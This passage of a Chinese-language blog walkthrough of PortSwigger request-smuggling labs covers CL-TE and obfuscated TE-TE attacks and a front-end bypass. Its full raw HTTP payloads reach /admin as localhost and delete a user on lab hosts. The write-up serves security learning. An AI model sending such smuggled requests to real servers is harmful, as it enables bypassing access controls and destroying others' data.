class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x6700;&#x540E;&#x9700;&#x8981;&#x52A0;&#x4E24;&#x4E2A; CRLF &#x6784;&#x9020; chunk data&#xFF0C;&#x4E5F;&#x5C31;&#x662F;</p><figure class="highlight taggerscript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line"><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></table></figure><p>&#x6839;&#x636E;&#x9898;&#x76EE;&#x7684;&#x63D0;&#x793A;&#x8981;&#x6C42;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x4E24;&#x6B21;&#x4EE5;&#x4E0A; HTTP &#x8BF7;&#x6C42;&#x5305;&#x5373;&#x53EF;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6536;&#x5230;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#x7684;&#x54CD;&#x5E94;&#x3002;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191122230209.png" alt></p><p>&#x8FC7;&#x7A0B;&#x6D41;&#x7A0B;&#x4E0E; CL-TE &#x7C7B;&#x4F3C;&#xFF0C;Front &#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#x6309;&#x7167; TE &#x4F18;&#x5148;&#x5904;&#x7406;&#xFF0C;&#x4F1A;&#x8BA4;&#x4E3A;&#x4E0A;&#x9762;&#x7684;&#x8BF7;&#x6C42;&#x4E3A;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x6574;&#x4F53;&#xFF0C;&#x7136;&#x540E;&#x8F6C;&#x53D1;&#x7ED9; Backend &#x670D;&#x52A1;&#x5668;&#xFF0C;Backend &#x670D;&#x52A1;&#x5668;&#x5728;&#x5904;&#x7406;&#x7684;&#x65F6;&#x5019;&#x6309;&#x7167; CL &#x4F18;&#x5148;&#x5904;&#x7406;&#xFF0C;&#x4F1A;&#x8BA4;&#x4E3A;<code>12\r\n</code>&#x4E3A;&#x7B2C;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x7684; body &#xFF0C;&#x4EE5;&#x4E0B;&#x4E3A;&#x7B2C;&#x4E8C;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x6240;&#x4EE5;&#x4F1A;&#x54CD;&#x5E94; GPOST &#x4E3A;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x7684; HTTP Method&#x3002;</p><h3 id="Two-Identical-Fields-TE"><a href="#Two-Identical-Fields-TE" class="headerlink" title="Two Identical Fields - TE"></a>Two Identical Fields - TE</h3><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x6765;&#x770B; TE &#x90FD;&#x5B58;&#x5728;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x540C;&#x6837;&#x6211;&#x4EEC;&#x501F;&#x52A9; LAB &#x5B9E;&#x9A8C;&#x6765;&#x52A0;&#x6DF1;&#x7406;&#x89E3;&#xFF1A;<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">Lab: HTTP request smuggling, obfuscating the TE header</a></p><blockquote><p>This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren&#x2019;t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>&#x6309;&#x7167;&#x9898;&#x76EE;&#x63D0;&#x793A;&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x8FBE;&#x5230;&#x7684;&#x4ECD;&#x7136;&#x662F;&#x8BA9;&#x540E;&#x7AEF;&#x6536;&#x5230; GPOST &#x8BF7;&#x6C42;&#xFF0C;&#x800C;&#x4E14;&#x573A;&#x666F;&#x4E5F;&#x660E;&#x786E;&#x544A;&#x8BC9;&#x6211;&#x4EEC;&#x662F;&#x4E00;&#x79CD; TE-TE &#x7684;&#x573A;&#x666F;&#x3002;&#x5176;&#x5B9E;&#x8FD9;&#x4E2A;&#x573A;&#x666F;&#x4E5F;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x662F;&#x76F8;&#x540C;&#x5B57;&#x6BB5;&#x7684;&#x573A;&#x666F;&#x5904;&#x7406;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;&#x5728;&#x5904;&#x7406;&#x4E24;&#x4E2A; TE &#x5B57;&#x6BB5;&#xFF0C;&#x5982;&#x679C;&#x53D6;&#x7B2C;&#x4E8C;&#x4E2A; TE &#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;&#x89E3;&#x6790;&#x6807;&#x51C6;&#xFF0C;&#x800C;&#x7B2C;&#x4E8C;&#x4E2A;&#x5B57;&#x6BB5;&#x503C;&#x975E;&#x6B63;&#x5E38;&#x6216;&#x8005;&#x89E3;&#x6790;&#x51FA;&#x9519;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x4F1A;&#x5FFD;&#x7565;&#x6389; TE &#x5B57;&#x6BB5;&#xFF0C;&#x800C;&#x4F7F;&#x7528; CL &#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x3002;&#x6BD4;&#x5982;&#x5728;&#x8FD9;&#x4E2A; LAB &#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x4E24;&#x904D;&#x5982;&#x4E0B;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Transfer-encoding</span>: nothing</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x540C;&#x4E0A;&#x4E00;&#x4E2A;&#x573A;&#x666F;&#x4E00;&#x6837;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x6700;&#x540E;&#x6DFB;&#x52A0;&#x4E24;&#x4E2A; CRLF &#xFF1A;</p><figure class="highlight taggerscript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line"><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x5982;&#x4E0B;&#x56FE;&#x7684;&#x54CD;&#x5E94;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123002425.png" alt></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x91CC;&#x662F;&#x7528;&#x4E86;&#x4E24;&#x4E2A; TE &#x5B57;&#x6BB5;&#xFF0C;&#x5E76;&#x4E14;&#x7B2C;&#x4E8C;&#x4E2A; TE &#x5B57;&#x6BB5;&#x503C;&#x975E;&#x6807;&#x51C6;&#x503C;&#xFF0C;&#x8FD9;&#x91CC; Front &#x9009;&#x62E9;&#x5BF9;&#x7B2C;&#x4E00;&#x4E2A; TE &#x8FDB;&#x884C;&#x4F18;&#x5148;&#x5904;&#x7406;&#xFF0C;&#x6574;&#x4E2A;&#x8BF7;&#x6C42;&#x5219;&#x4E3A;&#x6B63;&#x5E38;&#x8BF7;&#x6C42;&#xFF0C;&#x4F1A;&#x8F6C;&#x53D1;&#x7ED9; Backend &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x800C; Backend &#x670D;&#x52A1;&#x5668;&#x4EE5;&#x7B2C;&#x4E8C;&#x4E2A; TE &#x8FDB;&#x884C;&#x4F18;&#x5148;&#x5904;&#x7406;&#xFF0C;&#x800C;&#x7B2C;&#x4E8C;&#x4E2A; TE &#x503C;&#x975E;&#x6B63;&#x5E38;&#xFF0C;&#x5219;&#x4F1A;&#x53D6; CL &#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x8FD9;&#x6837;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x5C31;&#x4F1A;&#x56E0;&#x4E3A; CL &#x5B57;&#x6BB5;&#x8BBE;&#x7F6E;&#x7684;&#x503C; 4 &#x800C;&#x88AB;&#x62C6;&#x5206;&#x4E3A;&#x4E24;&#x4E2A;&#x8BF7;&#x6C42;&#x3002;</p><p>&#x7B2C;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Transfer-encoding</span>: nothing</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br></pre></td></tr></table></figure><p>&#x7B2C;&#x4E8C;&#x4E2A;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GPOST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x6837;&#x5C31;&#x53D1;&#x9001;&#x4E86;&#x4E00;&#x4E2A;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x7684; HTTP Method GPOST &#x8BF7;&#x6C42;&#x3002;</p><h2 id="Attack-Surface"><a href="#Attack-Surface" class="headerlink" title="Attack Surface"></a>Attack Surface</h2><p>&#x4E0A;&#x9762;&#x6211;&#x4EEC;&#x5927;&#x6982;&#x4ECB;&#x7ECD;&#x4E86;&#x51E0;&#x79CD;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#xFF0C;&#x4E0B;&#x9762;&#x6211;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E9B;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5E72;&#x561B;&#x3002;&#x540C;&#x6837;&#x6211;&#x4EEC;&#x5C06;&#x914D;&#x5408;&#x5B9E;&#x9A8C;&#x73AF;&#x5883;&#x5E2E;&#x52A9;&#x7406;&#x89E3;&#x4E0E;&#x590D;&#x73B0;&#x3002;</p><h3 id="Bypass-Front-end-Security-Controls"><a href="#Bypass-Front-end-Security-Controls" class="headerlink" title="Bypass Front-end Security Controls"></a>Bypass Front-end Security Controls</h3><p>&#x8FD9;&#x91CC;&#x63D0;&#x4F9B;&#x4E86;&#x4E24;&#x4E2A;&#x5B9E;&#x9A8C;&#x73AF;&#x5883;&#xFF0C;&#x4E00;&#x4E2A;&#x662F; CL-TE &#x5F62;&#x5F0F;&#x7684; <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</a> &#xFF0C;&#x4E00;&#x4E2A;&#x662F;TE-CL &#x5F62;&#x5F0F;&#x7684; <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</a>&#xFF0C;&#x4E24;&#x4E2A;&#x5B9E;&#x9A8C;&#x6700;&#x7EC8;&#x8FBE;&#x5230;&#x7684;&#x76EE;&#x7684;&#x4E00;&#x6837;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x968F;&#x4FBF;&#x9009;&#x7528; CL-TE &#x7684;&#x6765;&#x8FDB;&#x884C;&#x5B9E;&#x9A8C;&#x3002;</p><blockquote><p>&#x200B;    This lab involves a front-end and back-end server, and the front-end server doesn&#x2019;t support chunked encoding. There&#x2019;s an admin panel at /admin, but the front-end server blocks access to it.</p><p>To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.</p></blockquote><p>&#x67B6;&#x6784;&#x4E00;&#x6837;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x8FD9;&#x6B21;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x53BB;&#x5229;&#x7528; HTTP Smuggling &#x83B7;&#x53D6; admin &#x6743;&#x9650;&#x5E76;&#x5220;&#x9664; carlos &#x7528;&#x6237;&#x3002;</p><p>&#x6211;&#x4EEC;&#x751F;&#x6210; LAB &#x4E4B;&#x540E;&#xFF0C;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;<code>/admin</code>&#x4F1A;&#x53D1;&#x73B0; <code>&quot;Path /admin is blocked&quot;</code>&#xFF0C;&#x770B;&#x6765;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x6B63;&#x5E38;&#x65B9;&#x5F0F;&#x8BBF;&#x95EE;<code>/admin</code>&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x5C1D;&#x8BD5; HTTP Smuggling &#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x53D1;&#x9001;&#x5982;&#x4E0B;&#x6570;&#x636E;&#x5305;&#x4E24;&#x6B21;&#xFF1A;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 28</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin HTTP/1.1</span><br></pre></td></tr></table></figure><p>&#x5F97;&#x5230;&#x7684;&#x54CD;&#x5E94;&#x5982;&#x4E0B;&#x4E24;&#x56FE;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123154656.png" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123154609.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x7B2C;&#x4E8C;&#x4E2A;&#x8BF7;&#x6C42;&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x4E86;<code>/admin</code>&#x7684;&#x54CD;&#x5E94;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container is-page&quot;</span>&gt;</span></span><br><span class="line">  Admin interface only available if logged in as an administrator, or if requested as localhost</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x6DFB;&#x52A0; HOST &#x5934;&#x518D;&#x6B21;&#x53D1;&#x9001;&#x51E0;&#x6B21;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 45</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: localhost</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6210;&#x529F;&#x8BBF;&#x95EE;&#x5230;&#x4E86;<code>/admin</code>&#x9762;&#x677F;&#x5185;&#x5BB9;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x6210;&#x529F;&#x53EF;&#x4EE5;&#x591A;&#x53D1;&#x9001;&#x51E0;&#x6B21;&#x8BD5;&#x8BD5;&#x770B;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123155053.png" alt></p><p>&#x5F97;&#x5230;&#x4E86;&#x5220;&#x9664;&#x7684; api &#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x518D;&#x5229;&#x7528; HTTP Smuggling &#x8BBF;&#x95EE;&#x8FD9;&#x4E2A; <code>/admin/delete?username=carlos</code> &#x5373;&#x53EF;&#xFF0C;&#x6784;&#x9020;&#x5982;&#x4E0B;&#x6570;&#x636E;&#x5305;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 63</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: localhost</span><br></pre></td></tr></table></figure><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123155603.png" alt></p><p>&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x7C7B;&#x4F3C; HTTP SSRF &#xFF0C;&#x4E3B;&#x8981;&#x7684;&#x70B9;&#x5C31;&#x662F;&#x5728;&#x63A7;&#x5236; CL &#x6570;&#x503C;&#x4E0A;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5305; CL &#x7684;&#x503C;&#x4E3A; 28 &#xFF0C;&#x662F;&#x8FD9;&#x4E48;&#x8BA1;&#x7B97;&#x7684;&#xFF1A;</p><figure class="highlight livescript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span><span class="hljs-string">\r\n</span><span class="hljs-function">--&gt;</span> <span class="hljs-number">3</span>&#x4E2A;&#x5B57;&#x8282;</span><br><span class="line"><span class="hljs-string">\r\n</span><span class="hljs-function">--&gt;</span> <span class="hljs-number">2</span>&#x4E2A;&#x5B57;&#x8282;</span><br><span class="line">GET /admin HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><span class="hljs-function">--&gt;</span> <span class="hljs-number">19</span>+<span class="hljs-number">2</span> = <span class="hljs-number">21</span> &#x4E2A;&#x5B57;&#x8282;</span><br><span class="line"><span class="hljs-string">\r\n</span><span class="hljs-function">--&gt;</span> <span class="hljs-number">2</span>&#x4E2A;&#x5B57;&#x8282;</span><br></pre></td></tr></table></figure><p>&#x6240;&#x4EE5;&#x8FD9;&#x4E48;&#x7ED3;&#x7B97;&#x4E0B;&#x6765;&#x5C31;&#x662F; 3+2+21+2 = 28&#x5B57;&#x8282;&#x3002;</p><p>TE-CL &#x7684;&#x60C5;&#x51B5;&#x7C7B;&#x4F3C;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x518D;&#x91CD;&#x590D;&#x4E3E;&#x4F8B;&#x4E86;&#x3002;</p><h3 id="Revealing-Front-end-Request-Rewriting"><a href="#Revealing-Front-end-Request-Rewriting" class="headerlink" title="Revealing Front-end Request Rewriting"></a>Revealing Front-end Request Rewriting</h3><blockquote><p>&#x200B;    &#x5728;&#x6709;&#x7684;&#x7F51;&#x7EDC;&#x73AF;&#x5883;&#x4E0B;&#xFF0C;&#x524D;&#x7AEF;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5728;&#x6536;&#x5230;&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x4E0D;&#x4F1A;&#x76F4;&#x63A5;&#x8F6C;&#x53D1;&#x7ED9;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x800C;&#x662F;&#x5148;&#x6DFB;&#x52A0;&#x4E00;&#x4E9B;&#x5FC5;&#x8981;&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8F6C;&#x53D1;&#x7ED9;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x3002;&#x8FD9;&#x4E9B;&#x5B57;&#x6BB5;&#x662F;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x6240;&#x5FC5;&#x987B;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;</p><ul><li>&#x63CF;&#x8FF0;TLS&#x8FDE;&#x63A5;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x534F;&#x8BAE;&#x548C;&#x5BC6;&#x7801;</li><li>&#x5305;&#x542B;&#x7528;&#x6237;IP&#x5730;&#x5740;&#x7684;XFF&#x5934;</li><li>&#x7528;&#x6237;&#x7684;&#x4F1A;&#x8BDD;&#x4EE4;&#x724C;ID</li></ul><p>&#x603B;&#x4E4B;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x80FD;&#x83B7;&#x53D6;&#x5230;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x6216;&#x8005;&#x91CD;&#x5199;&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x6211;&#x4EEC;&#x8D70;&#x79C1;&#x8FC7;&#x53BB;&#x7684;&#x8BF7;&#x6C42;&#x5C31;&#x4E0D;&#x80FD;&#x88AB;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x6B63;&#x786E;&#x7684;&#x5904;&#x7406;&#x3002;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x8BE5;&#x5982;&#x4F55;&#x83B7;&#x53D6;&#x8FD9;&#x4E9B;&#x503C;&#x5462;&#x3002;PortSwigger&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;&#x5F88;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4E09;&#x5927;&#x6B65;&#x9AA4;&#xFF1A;</p><ul><li>&#x627E;&#x4E00;&#x4E2A;&#